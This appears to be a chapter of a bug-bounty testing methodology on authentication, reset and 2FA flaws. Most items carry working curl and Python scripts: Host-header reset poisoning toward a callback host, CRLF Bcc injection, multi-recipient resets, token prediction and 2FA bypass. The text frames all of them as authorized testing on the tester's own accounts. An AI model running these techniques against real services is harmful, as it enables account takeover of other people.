# AUT · Authentication, sessions, password reset & 2FA

> The server accepts something as proof of identity that the account owner never had to supply: a reset token
> delivered elsewhere, a code the client was told, a login path that never asks for the second factor, a session
> that should be dead. It is critical when the end state is another user's account with no interaction. It is
> closed as informative when all it shows is hygiene: session lifetime, a missing rate limit, enumeration.

| | |
|---|---|
| **Class** | `authn` |
| **Applies when** | http, app\|api, login |
| **Pays** | 1,339 disclosed reports filed under the class (587 more touch it), 218 paid, median $500, top $35,000. The best-paid ones took over another user's account through the reset or recovery flow, or reached an account or feature on a path that skipped a verification step (second factor, e-mail verification). |
| **Weaknesses** | Improper Authentication - Generic, Weak Password Recovery Mechanism for Forgotten Password, Improper Restriction of Authentication Attempts, Authentication Bypass Using an Alternate Path or Channel, Insufficient Session Expiration, Session Fixation · CWE-287, CWE-640, CWE-307, CWE-288, CWE-613, CWE-384 |

## Why it pays

Every other control assumes authentication worked, so a flaw here is rated on the end state. Any account taken
with only its e-mail address and no interaction is critical: the reset link retrieved by the requester
(#2293343, $35,000), the reset token returned in the HTTP response (#173551, $10,000), an account-recovery
flow with improper authentication (#2443228, $12,000). A requirement that an alternate path does not enforce is
medium to high: a 2FA-only feature reached through an embedded form (#418767, $10,000), e-mail verification
bypassed with an extra field (#1551176, $5,000) or for OAuth grants (#922456, $3,000). A short code with no
attempt cap is high when the arithmetic is shown (#407971, $2,500; #700612, $1,657; #1265709, $750).

These flows are hand-written state machines: issue a secret, deliver it, check it, change the credential,
revoke what existed before. Each transition is a place where the server can trust the wrong input: the header
that names the link host, the parameter that names the recipient, the client that reports the code was right,
the login route that predates the second factor.

Only 218 of the 1,339 reports were paid. The rest is mostly hygiene: sessions that survive logout, rate limits
missing where nothing short is being guessed, enumeration, reset tokens in a `Referer` header, reset links that
live for a day. Those are in the graveyard below, and the items that can produce nothing else carry the
exclusion tag that closes them.

## The crux question

**For each way of becoming a user (login, reset, verification, SSO, remembered device), what exactly does the
server accept as proof, and can I produce that proof for an account whose mailbox, second factor, password and
sessions I do not hold?**

## Applicability probe

Settle `login` first, then the flow facts the items gate on: `signup`, `password-reset`, `mfa`, `oauth-login`,
`cookie-auth`, `email-out`.

```bash
# 1. Authentication routes: common paths, then every route the bundles name
for p in /login /signin /signup /register /forgot /password/reset /users/sign_in /account/login /api/login; do
  curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{redirect_url} $p\n" "$T$p"; done
grep -rhoE "[\"'\`]/[A-Za-z0-9_/.-]*(login|signin|sign_in|signup|register|password|forgot|reset|recover|otp|2fa|mfa|totp|verify|confirm|session|logout|remember|sso|oauth|saml)[A-Za-z0-9_/.-]*" \
  "$E/recon/$H/js/" | sort | uniq -c | sort -rn | head -60
# 2. How the session travels: the cookie alone, then the Authorization header alone
C=$(grep -i '^cookie:' "$E/accounts/A.headers"); Z=$(grep -i '^authorization:' "$E/accounts/A.headers")
[ -n "$C" ] && curl -sS "${HDR[@]}" -H "$C" -o /dev/null -w 'cookie only  %{http_code}\n' "$T/api/me"
[ -n "$Z" ] && curl -sS "${HDR[@]}" -H "$Z" -o /dev/null -w 'bearer only  %{http_code}\n' "$T/api/me"
# 3. One reset for our own account A. Read the raw mail: link host, token length and alphabet, stated lifetime
curl -sS "${HDR[@]}" -D- -o /dev/null -X POST "$T/password/reset" --data-urlencode 'email=<A e-mail>'
# 4. Security settings as A: a 2FA switch, backup codes, a session list, a "remember me" box, SSO buttons
curl -sS "${HDR[@]}" $A "$T/settings/security" | grep -aoiE 'two[- ]factor|2fa|authenticator|backup code|recovery code|active sessions|sign out everywhere|remember me|sign in with [a-z]+' | sort | uniq -c
```

```bash
scripts/sane fact set "$H" login=1 signup=1 --ev "password form at /login (POST /api/login); open registration at /signup"
scripts/sane fact set "$H" password-reset=1 email-out=1 --ev "POST /password/reset mails https://$H/password/reset/<43 chars>, valid 2 h"
scripts/sane fact set "$H" mfa=1 cookie-auth=1 oauth-login=0 --ev "TOTP and backup codes in /settings/security; cookie sid alone authenticates /api/me; no SSO button"
# the host has no authentication of its own:
scripts/sane fact set "$H" login=0 --ev "static docs; 'Sign in' links to accounts.example.com, which is a separate asset"
```

With `login` false the chapter closes for the asset; the planner writes the reason. When the login form lives
on a central accounts host, run the chapter there and say so in the note. Write one line per flow (request,
parameters, what is mailed or sent by SMS, what the last step returns) in `$E/recon/$H/map.md`: every item
starts from those saved requests. The paths in the items are examples; replace them with the saved ones. All
tests run against our own accounts and mailboxes. No item is ever aimed at a real user.

## Triage order

AUT-003 (second recipient: a dozen requests, critical ceiling) → AUT-005 (code check passable without the
secret) → AUT-001 (poisoned reset link) → AUT-006 (login paths without the second factor) → AUT-014
(verification bypass) → AUT-012 (e-mail spelling confusion) → AUT-004 (reset token lifecycle) → AUT-002 (token
predictability, mostly offline) → AUT-007 (code reuse and cross-account acceptance) → AUT-009 (2FA settings
without step-up) → AUT-015 (e-mail or password change with a session alone) → AUT-013 (pre-registration plus
SSO) → AUT-016 (fixation) → AUT-011 (default passwords in our tenant) → AUT-010 (limiter bypass) → AUT-008
(code guessing, only with `bruteforce-ok`) → AUT-017 (revocation; usually excluded) → AUT-018 (enumeration;
usually excluded).

## Items

### AUT-001 · The password-reset token reaches a host other than the application's, through a poisoned link host or the reset page's Referer

| | |
|---|---|
| **Severity** | High standalone for the poisoned link (one click on a genuine e-mail hands over a working token); Low for the Referer path alone |
| **Requires** | password-reset, email-out, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Weak Password Recovery Mechanism for Forgotten Password · CWE-640 |
| **Prior art** | #226659, #1108874, #751581, #6884 |

- **Where:** the forgot-password request in every form it exists (web form, JSON API, mobile API, GraphQL
  mutation) and every other mail with a tokenised link: invitation, e-mail verification, magic-link login,
  e-mail-change confirmation. For the Referer path: the page the mailed link opens.
- **Test:** two ways the token in the mailed URL leaves the application. (A) The mailer builds the link from
  the request's `Host` or a forwarded-host header, so a reset the attacker requests for the victim's address
  sends the victim a genuine mail whose link points at the attacker's host; the click delivers the token.
  (B) The reset page loads third-party resources and the full URL, token included, goes out in `Referer` or in
  an analytics beacon.
- **How:** (A) one reset request per header variant for our own account, 30 seconds apart so a per-address
  throttle does not drop one silently. Each variant names its own callback host, so the mail shows which one
  worked.
  ```bash
  EV='<e-mail of our own account, the victim>'; D="$E/evidence/$H/AUT-001"; mkdir -p "$D"; U="$T/password/reset"
  rq(){ n=$1; shift; curl -sS --http1.1 "${HDR[@]}" -D "$D/$n.hdr" -o "$D/$n.body" -w "$n %{http_code}\n" -X POST \
    -H 'Content-Type: application/json' -d "{\"email\":\"$EV\"}" "$@"; sleep 30; }
  rq base  "$U"
  rq host  "$U" -H "Host: aut001-host.$OOB"
  rq xfh   "$U" -H "X-Forwarded-Host: aut001-xfh.$OOB"
  rq xhost "$U" -H "X-Host: aut001-xhost.$OOB"
  rq xfsrv "$U" -H "X-Forwarded-Server: aut001-xfsrv.$OOB"
  rq xorig "$U" -H "X-Original-Host: aut001-xorig.$OOB"
  rq fwd   "$U" -H "Forwarded: host=aut001-fwd.$OOB"
  rq port  "$U" -H "Host: $H:@aut001-port.$OOB"
  rq abs   "$U" --request-target "https://aut001-abs.$OOB/password/reset"
  # save each raw mail from the victim mailbox as $D/mail-<variant>.eml (decode quoted-printable), then list link hosts
  grep -aoE 'https?://[^/"<> ]+' "$D"/mail-*.eml | sort | uniq -c
  # the victim's click, done by us: the token must arrive at the callback host and then work on the real host
  curl -sS "${HDR[@]}" -o /dev/null '<poisoned link from the mail>'
  curl -sS "${HDR[@]}" -o /dev/null -w 'real host accepts the token: %{http_code}\n' "$T/password/reset/<token from the callback log>"
  ```
  (B) open a genuine reset link in the scriptable browser and print every request to another host that carries
  the token:
  ```python
  # python3 aut001_referer.py '<genuine reset link from the victim mailbox>'
  import sys, re
  from urllib.parse import urlparse
  from playwright.sync_api import sync_playwright
  link = sys.argv[1]; site = urlparse(link).hostname
  tok = max(re.findall(r'[A-Za-z0-9_-]{16,}', link), key=len)
  with sync_playwright() as p:
      b = p.chromium.launch(); pg = b.new_context().new_page()   # pass the programme's headers as extra_http_headers
      def seen(r):
          if urlparse(r.url).hostname != site and tok in r.url + ' ' + r.headers.get('referer', '') + ' ' + (r.post_data or ''):
              print('LEAK', r.method, r.url[:140], '| referer:', r.headers.get('referer', '-'))
      pg.on('request', seen); pg.goto(link, wait_until='networkidle'); pg.wait_for_timeout(3000); b.close()
  ```
- **Proof:** for (A): the request with the forged header, the raw mail received by our victim account whose
  link host is `aut001-<variant>.$OOB`, the callback log line holding the token, and that token accepted by the
  real host to set the account's password. For (B): the captured request to the third party with the token in
  it, and the token still accepted afterwards.
- **Not a finding when:** the forged host shows up in the HTTP response (a redirect, a canonical link) while the
  mail still carries the real host: that is bare Host reflection (`host-header`, HHI chapter). Only a logo or
  tracking-pixel URL in the mail follows the header and the reset link keeps the real host: content spoofing
  at most (`content-spoofing`). For (B): the request goes to a first-party host of the same organisation; the
  third party receives only the origin because the browser default `strict-origin-when-cross-origin` strips
  path and query (a leak then needs an explicit `Referrer-Policy: unsafe-url` or a script that reads
  `location.href`); the token is consumed when the page loads. A token in `Referer` to an analytics vendor is
  closed as informative on most programmes; report it only with a third party the attacker can read.
- **Escalate:** take the account over with the delivered token, then check whether the reset also logs in past
  the second factor (AUT-006) and how long the token lives (AUT-004). A header that controls only the scheme
  (`X-Forwarded-Proto: http`) is weaker: an `http://` link needs a network position (`mitm`). A reset page
  that a shared cache stores with the poisoned host is CCH. AUT-018 supplies valid identifiers, but the proof
  stays on our own account.

### AUT-002 · A password-reset or remember-me token can be computed from values the attacker knows

| | |
|---|---|
| **Severity** | Critical standalone when a token for an account is computed without its mailbox and accepted; None for a remark about token format with no working computation |
| **Requires** | password-reset\|cookie-auth, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Use of Insufficiently Random Values · CWE-330 |
| **Prior art** | #1380121, #332632, #3385434, #271533 |

- **Where:** every secret the server mints and later accepts as proof: reset tokens, e-mail-verification and
  invitation tokens, magic-link logins, and the remember-me cookie (`remember_token`, `remember_user_token`,
  `remember_web_*`, `REMEMBERME`, `rememberme`, `persistent`, `auth_token`).
- **Test:** collect ten tokens for our own account in quick succession, with the server `Date` of each request,
  and look for structure: a short or low-entropy value, an encoding of known fields (e-mail, user id, time), a
  plain hash of them, a time-based identifier (UUIDv1, MongoDB ObjectId, PHP `uniqid`), a counter, or a signed
  container whose key can be cracked. Then compute the next token before reading the mail.
- **How:**
  ```bash
  EA='<A e-mail>'; D="$E/evidence/$H/AUT-002"; mkdir -p "$D"
  for i in $(seq 1 10); do curl -sS "${HDR[@]}" -D "$D/req$i.hdr" -o /dev/null -X POST "$T/password/reset" \
    -H 'Content-Type: application/json' -d "{\"email\":\"$EA\"}"; sleep 15; done
  # copy the ten tokens from A's mailbox into $D/tokens.txt, oldest first, one per line
  python3 - "$D" "$EA" '<A user id>' <<'PY'
  import sys, re, os, base64, hashlib, itertools, email.utils
  d, em, uid = sys.argv[1:4]
  toks = [l.strip() for l in open(d + '/tokens.txt') if l.strip()]
  when = [int(email.utils.parsedate_to_datetime(re.search(r'(?im)^date:\s*(.+?)\r?$', open(f'{d}/req{i}.hdr').read()).group(1)).timestamp())
          for i in range(1, len(toks) + 1)]
  ishex = lambda t: re.fullmatch(r'[0-9a-fA-F]+', t)
  print('distinct', len(set(toks)), 'of', len(toks), '| lengths', sorted({len(t) for t in toks}), '| alphabet', len(set(''.join(toks))))
  print('common prefix', repr(os.path.commonprefix(toks)[:40]))
  for t in toks[:2]:
      if not ishex(t):
          try: print('base64 ->', base64.urlsafe_b64decode(t + '=' * (-len(t) % 4))[:80])
          except Exception: pass
      if re.fullmatch(r'[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}', t): print('UUIDv1: clock and node id, not random')
      if re.fullmatch(r'[0-9a-f]{24}', t): print('ObjectId-like: time', int(t[:8], 16), 'counter', int(t[18:], 16))
      if re.fullmatch(r'[0-9a-f]{13}', t): print('PHP uniqid-like: time', int(t[:8], 16), 'usec', int(t[8:], 16))
  if all(t.isdigit() for t in toks): print('numeric deltas', [int(b) - int(a) for a, b in zip(toks, toks[1:])])
  for t, ts in zip(toks, when):                      # plain hashes of known fields around the request second
      if len(t) not in (32, 40, 64) or not ishex(t): continue
      parts = list(dict.fromkeys([em, em.lower(), uid] + [str(ts + k) for k in range(-3, 4)]))
      cands = {sep.join(c) for n in (1, 2, 3) for c in itertools.permutations(parts, n) for sep in ('', ':', '|', '-')}
      for s in cands:
          for alg in ('md5', 'sha1', 'sha256'):
              if hashlib.new(alg, s.encode()).hexdigest() == t.lower(): print('MATCH', alg, repr(s), '->', t)
  PY
  # remember-me cookie: log in twice with the box ticked and compare the two values the same way
  printf %s '<remember-me cookie value>' | tr '_-' '/+' | base64 -d 2>/dev/null | xxd | head
  ```
  Three dot-separated base64url parts are a JWT (JWT chapter). `payload.timestamp.signature` is an
  itsdangerous or Django signed value and `payload--signature` a Rails one: the offline crack is JWT-004.
- **Proof:** a token for our own account computed from the request time and public fields before the mail was
  opened, equal to the mailed token (script input and output saved). For full impact the same computation for
  our second account B, accepted by the reset endpoint to set B's password, or a forged remember-me cookie
  returning B's profile.
- **Not a finding when:** the value is 128 bits or more with no shared prefix, no decodable content and no time
  component: ten samples cannot prove a generator strong, they can only show structure, so record a negative.
  UUIDv4 is random. A visible user id or timestamp next to a random or MAC part predicts nothing. A signed
  container with an unknown key is not predictable. A numeric code of four to eight digits is AUT-008, not this
  item. The same token re-sent for a repeated request inside its lifetime is a design choice (AUT-004).
- **Escalate:** a computed reset token is takeover of any account by e-mail address; prove it on B once and
  stop. A forged remember-me cookie is a forged session: check whether it also skips the second factor
  (AUT-006) and survives a password change (AUT-017). A cracked or default framework secret usually signs
  sessions too (JWT-004, DSR chapter).

### AUT-003 · The reset request delivers the victim's reset link to a second address supplied by the attacker

| | |
|---|---|
| **Severity** | Critical standalone: any account is taken with its e-mail address and no interaction |
| **Requires** | password-reset, email-out, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Weak Password Recovery Mechanism for Forgotten Password · CWE-640 |
| **Prior art** | #2293343, #96636 |

- **Where:** the request that asks for a reset mail, in every variant the product has (HTML form, JSON API,
  mobile API, GraphQL mutation). The same shape exists in "resend verification", magic-link login and
  invitation resend.
- **Test:** the handler looks the account up with one value and mails to another, or accepts a list. Send the
  victim's address together with a second address of ours as an array, a duplicate parameter, a JSON list, a
  duplicate JSON key, one string with a separator, a mail-header injection, and a query-string copy that
  overrides the body. A hit is a mail at the second address whose link resets the victim account.
- **How:** use the field name of the real request (`email`, `user[email]`, `login`, `username`). The second
  address has no account on the target, so any reset mail it receives belongs to the victim. One request per
  variant, 30 seconds apart; after each, look at both mailboxes.
  ```bash
  EV='<e-mail of our own account, the victim>'; EM='<another address of ours, no account on the target>'
  D="$E/evidence/$H/AUT-003"; mkdir -p "$D"; U="$T/users/password"
  f(){ n=$1; shift; curl -sS "${HDR[@]}" -o "$D/$n.body" -w "$n %{http_code} %{size_download}\n" -X POST "$@"; sleep 30; }
  f arr-form  "$U" --data-urlencode "user[email][]=$EV" --data-urlencode "user[email][]=$EM"
  f dup-form  "$U" --data-urlencode "email=$EV" --data-urlencode "email=$EM"
  f dup-rev   "$U" --data-urlencode "email=$EM" --data-urlencode "email=$EV"
  f arr-json  "$U" -H 'Content-Type: application/json' -d "{\"email\":[\"$EV\",\"$EM\"]}"
  f dup-key   "$U" -H 'Content-Type: application/json' -d "{\"email\":\"$EV\",\"email\":\"$EM\"}"
  f comma     "$U" --data-urlencode "email=$EV,$EM"
  f semicolon "$U" --data-urlencode "email=$EV;$EM"
  f space     "$U" --data-urlencode "email=$EV $EM"
  f bcc       "$U" --data-urlencode "email=$EV"$'\r\n'"Bcc: $EM"
  f query     "$U?email=$(printf %s "$EM" | sed 's/@/%40/; s/+/%2B/g')" --data-urlencode "email=$EV"
  ```
  Open any reset link that arrives at the second address and read whose account the form names before
  submitting it.
- **Proof:** the single request, the raw mail delivered to the second address containing a reset link, and that
  link setting a new password on the victim account: a login with the new password whose profile call returns
  the victim's user id. Account and both mailboxes are ours.
- **Not a finding when:** the response is the same 200 for every variant and no extra mail arrives: uniform
  answers are enumeration protection, not delivery. Only the victim address receives mail. The variant returns
  a 500 and nothing is sent. The second address does have an account and the link it received resets that
  account: the server treated the list as two separate requests.
- **Escalate:** nothing higher exists; stop after one takeover of our own account. Then try the same variants
  on the other mailed-secret flows (verification resend, magic link, e-mail-change confirmation, e-mailed 2FA
  codes) and name every affected flow in one report.

### AUT-004 · A reset token stays valid after use, after a newer token, or after the password or e-mail changed

| | |
|---|---|
| **Severity** | Low standalone; Medium when a token mailed to the old address still resets the account after an e-mail change; High with a token leak (AUT-001) |
| **Requires** | password-reset, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Weak Password Recovery Mechanism for Forgotten Password · CWE-640 |
| **Prior art** | #1288898, #1021232, #685007, #772886 |

- **Where:** the reset link or code of every reset flow, and the equivalent tokens for e-mail change and
  e-mail verification.
- **Test:** a reset token should die when it is used, when a newer one is issued, and when the credential it
  recovers changes. Run five cases on our own account: (a) use the token twice; (b) issue a second token and
  use the first; (c) change the password in settings and then use a token issued before; (d) move the account
  to another address we own and then use the token mailed to the old address; (e) note the lifetime and retry a
  token at the next session.
- **How:** use account B when we hold two, so A's saved session and password stay as they are.
  ```bash
  EV='<e-mail of our own account under test>'; D="$E/evidence/$H/AUT-004"; mkdir -p "$D"; CT='Content-Type: application/json'
  ask(){ curl -sS "${HDR[@]}" -o /dev/null -w "ask %{http_code}\n" -X POST "$T/password/reset" -H "$CT" -d "{\"email\":\"$EV\"}"; sleep 30; }
  use(){ curl -sS "${HDR[@]}" -o "$D/$1.body" -w "$1 %{http_code} %{size_download}\n" -X POST "$T/password/reset/confirm" \
    -H "$CT" -d "{\"token\":\"$2\",\"password\":\"$3\"}"; }
  can(){ curl -sS "${HDR[@]}" -o /dev/null -w "login with $1: %{http_code}\n" -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$1\"}"; }
  ask; T1='<token 1>'
  use first "$T1" 'Aut004-one!';  can 'Aut004-one!'      # control: must succeed
  use reuse "$T1" 'Aut004-two!';  can 'Aut004-two!'      # (a)
  ask; T2='<token 2>'; ask; T3='<token 3>'
  use older "$T2" 'Aut004-three!'; can 'Aut004-three!'   # (b)
  ask; T4='<token 4>'   # now change the password in settings while logged in, then:
  use after-change "$T4" 'Aut004-four!'; can 'Aut004-four!'   # (c)
  ask; T5='<token 5>'   # now change the account e-mail to a second address of ours and confirm it, then:
  use after-move "$T5" 'Aut004-five!'                         # (d) then log in with the new address and this password
  ```
- **Proof:** the table of cases with the response to each stale token and the login that shows the password it
  set is now the account's password. Case (d) is the strongest: whoever can read the old mailbox takes the
  account back after the owner moved it.
- **Not a finding when:** the stale token opens the form (GET 200) and the POST is refused. Several unexpired
  tokens are valid at once and each dies on use: many programmes accept that as design. A token survives a
  normal login: nothing it recovers has changed. A lifetime of hours or a day with nothing else wrong is
  informative. The replay only works from the browser session that already exchanged the token for a
  session-bound reset cookie: repeat from a clean client.
- **Escalate:** a reusable or long-lived token raises the value of any leak (AUT-001, logs, INF chapter). A
  stateless signed token (JWT, itsdangerous, Rails signed id) cannot be revoked unless its signature covers the
  password hash: read its `exp` and see JWT-008. After a successful reset, check which sessions died (AUT-017)
  and whether the second factor was asked (AUT-006).

### AUT-005 · A reset-code or OTP check is passed without the secret because the server returns it or the next step does not depend on it

| | |
|---|---|
| **Severity** | Critical standalone when an account is reset or logged in to with its identifier alone; High when only the second factor is skipped (the password is still needed) |
| **Requires** | password-reset\|mfa, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Client-Side Enforcement of Server-Side Security · CWE-602 |
| **Prior art** | #173551, #699082, #897385, #2962527 |

- **Where:** flows of several requests where the user types a secret: reset by e-mailed or SMS code, one-time
  login codes, the 2FA challenge after the password, e-mail or phone verification. The three requests that
  matter are "send the secret", "check the secret" and the step after it (set the password, or the first
  authenticated call).
- **Test:** the server gives the gate away to the client. (1) The secret, or a hash of it, is in the response,
  headers or cookies of the request that triggers it. (2) The check accepts an empty, null or missing value.
  (3) The step after the check carries nothing that proves the check passed: this is what "response
  manipulation" exploits, and without a proxy it is tested by sending the next request directly. For 2FA, the
  password step already returned a session that authenticated endpoints accept.
- **How:** run the flow from a clean cookie jar against our own account; the mailbox is read only to know what
  to search for.
  ```bash
  EV='<e-mail of our own account, the victim>'; PV='<its password>'
  D="$E/evidence/$H/AUT-005"; mkdir -p "$D"; J="$D/jar"; CT='Content-Type: application/json'
  # 1. is the secret handed to the requester?
  curl -sS "${HDR[@]}" -c "$J" -D "$D/send.hdr" -o "$D/send.body" -X POST "$T/api/password/forgot" -H "$CT" -d "{\"email\":\"$EV\"}"
  CODE='<code or token from the victim mailbox>'
  grep -a -n -F "$CODE" "$D/send.hdr" "$D/send.body" "$J"
  for h in md5sum sha1sum sha256sum; do printf %s "$CODE" | $h | cut -d' ' -f1; done | grep -a -n -F -f - "$D/send.hdr" "$D/send.body"
  # 2. empty, null and missing values at the check
  for c in '"000000"' '""' 'null' 'true' '0' '[]'; do printf '%-9s ' "$c"; curl -sS "${HDR[@]}" -b "$J" -c "$J" -o "$D/verify.body" \
    -w '%{http_code} %{size_download}\n' -X POST "$T/api/password/verify" -H "$CT" -d "{\"email\":\"$EV\",\"code\":$c}"; sleep 2; done
  curl -sS "${HDR[@]}" -b "$J" -c "$J" -w 'no field %{http_code}\n' -o /dev/null -X POST "$T/api/password/verify" -H "$CT" -d "{\"email\":\"$EV\"}"
  # 3. the step after the check, from a client that never passed it
  curl -sS "${HDR[@]}" -b "$J" -o "$D/final.body" -w 'final %{http_code}\n' -X POST "$T/api/password/reset" -H "$CT" \
    -d "{\"email\":\"$EV\",\"password\":\"Aut005-new-pw!\"}"
  # 2FA form: password step only, then an authenticated endpoint with whatever cookie or token it returned
  curl -sS "${HDR[@]}" -c "$J.2fa" -o "$D/login.body" -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$PV\"}"
  curl -sS "${HDR[@]}" -b "$J.2fa" -o "$D/me.body" -w 'me before the code: %{http_code}\n' "$T/api/me"
  ```
  If the login response body holds a token instead of setting a cookie, send it as `Authorization: Bearer`.
- **Proof:** from a client that holds only the account's identifier (or, for 2FA, its password): the response
  that contains the secret, or the final request succeeding without a valid code, followed by a login with the
  new password or a profile call returning the account's data. Raw requests and responses saved.
- **Not a finding when:** flipping the check's response shows the next screen but the next API call is refused:
  the client moved, the server did not. The value in the response is a flow id, CSRF token or reset-session
  handle that still needs the code. The session returned by the password step reaches only the challenge,
  logout and static configuration and gets 401 or 403 on data. The secret shown is the account owner's own
  enrolment secret during 2FA setup. An empty code is accepted only on an account with no second factor
  enrolled.
- **Escalate:** list which authenticated endpoints accept the pre-2FA session; often it is one API version
  (AUT-006), and if 2FA can be disabled from it the factor is gone for good (AUT-009). A secret in the response
  of a passwordless login is takeover by phone number or e-mail. The same three checks apply to the GraphQL
  mutations of the flow (GQL chapter).

### AUT-006 · An alternate login path opens a 2FA-protected account without the second factor

| | |
|---|---|
| **Severity** | Medium standalone (the attacker still needs the password); High when the path needs no password either, such as SSO matched by e-mail or a reset that logs in |
| **Requires** | mfa, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Authentication Bypass Using an Alternate Path or Channel · CWE-288 |
| **Prior art** | #418767, #1593404, #1247108, #2197244 |

- **Where:** every route that ends in a session or token for the account, not only the web form: older API
  versions, the mobile login endpoint, `POST /oauth/token` with `grant_type=password`, HTTP Basic on the API,
  a GraphQL login mutation, SSO buttons, magic links, the password-reset completion, embedded or partner forms,
  regional and seller portals on other hosts, and single endpoints that ask for the password again (delete
  account, export data, create API key).
- **Test:** enable 2FA on our own account. Authenticate through each route with the password alone and call an
  authenticated endpoint. The second factor was added to one login controller; the others were never told.
- **How:**
  ```bash
  EV='<e-mail of our own account with 2FA enabled>'; PV='<its password>'
  D="$E/evidence/$H/AUT-006"; mkdir -p "$D"; CT='Content-Type: application/json'
  chk(){ n=$1; shift; printf '%-9s ' "$n"; curl -sS "${HDR[@]}" -o "$D/$n.body" -w '%{http_code} %{size_download}\n' "$@"; sleep 1; }
  chk basic   -u "$EV:$PV" "$T/api/v1/me"
  chk ropc    -X POST "$T/oauth/token" -d grant_type=password --data-urlencode "username=$EV" --data-urlencode "password=$PV"
  chk v1      -X POST "$T/api/v1/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$PV\"}"
  chk mobile  -X POST "$T/api/mobile/login" -H "$CT" -d "{\"email\":\"$EV\",\"password\":\"$PV\"}"
  chk graphql -X POST "$T/graphql" -H "$CT" \
    -d '{"query":"mutation($e:String!,$p:String!){login(email:$e,password:$p){token}}","variables":{"e":"'"$EV"'","p":"'"$PV"'"}}'
  # login-shaped routes the UI does not use
  grep -rhoE "[\"'\`]/[A-Za-z0-9_/.-]*(login|signin|sign_in|session|token|authenticate)[A-Za-z0-9_/.-]*" "$E/recon/$H/js/" | sort -u
  # a token from any of them, then data:
  curl -sS "${HDR[@]}" -H 'Authorization: Bearer <token from an alternate route>' -w '\n%{http_code}\n' "$T/api/me"
  ```
  Reset path: complete a password reset for the account and see whether the response sets an authenticated
  session without the code. SSO path (only when `oauth-login` holds and we own an IdP identity with the
  account's address): sign in through the IdP in the scriptable browser and see whether the challenge appears.
- **Proof:** the account's settings showing 2FA enabled, the normal web login stopping at the challenge, and the
  alternate route returning a session or token that reads the account's private data, all without a code.
- **Not a finding when:** the alternate token is scope-limited and data endpoints refuse it. The credential is
  an API key or app password that the user created inside a 2FA session: that is the documented exemption.
  The account was created through the IdP and the product delegates the second factor to it. "Remember this
  device" skips the challenge on the browser that already passed it. The reset completes and then asks for the
  code before any session exists.
- **Escalate:** a route that needs no password (SSO attached by e-mail match, reset auto-login combined with
  AUT-001 or AUT-003) is takeover of 2FA accounts. A password-only destructive endpoint is shown once on our
  own account and not repeated. From the session obtained, AUT-009 removes the factor.

### AUT-007 · A one-time code or backup code is accepted twice, or on another account's challenge

| | |
|---|---|
| **Severity** | Critical standalone when a code issued to A passes B's challenge; Low for replay of the account's own used code or backup code |
| **Requires** | mfa, two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Authentication - Generic · CWE-287 |
| **Prior art** | #921780, #1250474, #1485788, #2529780 |

- **Where:** the endpoint that checks the second factor or a one-time login code (TOTP, e-mailed or SMS code,
  backup or recovery code), and any other feature that reuses the same code service: phone verification,
  e-mail change, payment confirmation.
- **Test:** four properties of a one-time secret. (a) Used once: the same TOTP inside its 30-second step, or
  the same mailed code, fails in a second session. (b) Superseded: after a resend, the earlier code fails.
  (c) Backup codes are single-use, and the old set dies when a new set is generated. (d) Bound to the account:
  a code valid for A fails on B's challenge. Also submit a code issued for one purpose (verification) where
  another (login) is expected.
- **How:** 2FA enabled on A and B, separate cookie jars for every login.
  ```bash
  EA='<A e-mail>'; PA='<A password>'; EB='<B e-mail>'; PB='<B password>'; SA='<A TOTP secret, base32>'
  D="$E/evidence/$H/AUT-007"; mkdir -p "$D"; CT='Content-Type: application/json'
  login(){ curl -sS "${HDR[@]}" -c "$1" -o /dev/null -X POST "$T/api/login" -H "$CT" -d "{\"email\":\"$2\",\"password\":\"$3\"}"; }
  otp(){ curl -sS "${HDR[@]}" -b "$2" -c "$2" -o "$D/$1.body" -w "$1 %{http_code} %{size_download}\n" -X POST "$T/api/2fa/verify" -H "$CT" -d "{\"code\":\"$3\"}"; }
  me(){ curl -sS "${HDR[@]}" -b "$1" "$T/api/me" | head -c 200; echo; }
  C=$(oathtool --totp -b "$SA")
  login "$D/a1" "$EA" "$PA"; otp first  "$D/a1" "$C"                                   # control: accepted
  login "$D/a2" "$EA" "$PA"; otp replay "$D/a2" "$C"; me "$D/a2"                       # (a) same step, second session
  login "$D/b1" "$EB" "$PB"; otp cross  "$D/b1" "$(oathtool --totp -b "$SA")"; me "$D/b1"   # (d) A's code, B's challenge
  BK='<one unused backup code of A>'
  login "$D/a3" "$EA" "$PA"; otp bk-first "$D/a3" "$BK"
  login "$D/a4" "$EA" "$PA"; otp bk-again "$D/a4" "$BK"; me "$D/a4"                    # (c)
  # regenerate A's backup codes in settings, then try one code of the old set the same way
  ```
  For mailed or SMS codes replace `oathtool` with the code received, and for (b) request a resend before
  submitting the first code.
- **Proof:** for (d): B's session opened with a code only A could produce, the profile call returning B. For
  (a) to (c): two accepted verifications of one code from two separate sessions, with timestamps, or an old
  backup code accepted after regeneration.
- **Not a finding when:** both logins shared a cookie jar, so the session that passed was A's all along. The
  code of the adjacent 30-second step is accepted: RFC 6238 allows that drift. A resend delivers the same
  unexpired code again. Replay of a TOTP inside its own step is closed as informative on many programmes
  because the attacker must already hold the password and a live code; report it as low and say so.
- **Escalate:** where login is by code alone (phone number or e-mail plus code), cross-account acceptance is
  takeover with no password. Codes that stay valid after use make AUT-008 cheaper. Old backup codes that
  survive regeneration keep an intruder in after the owner reacts: state that as the impact.

### AUT-008 · A short numeric code can be guessed within its lifetime because failed attempts are not bounded

| | |
|---|---|
| **Severity** | High standalone for login and reset codes (takeover by identifier, arithmetic shown); Medium for a 2FA code, where the password is also needed |
| **Requires** | mfa\|password-reset, account, bruteforce-ok |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | high |
| **Weakness** | Improper Restriction of Authentication Attempts · CWE-307 |
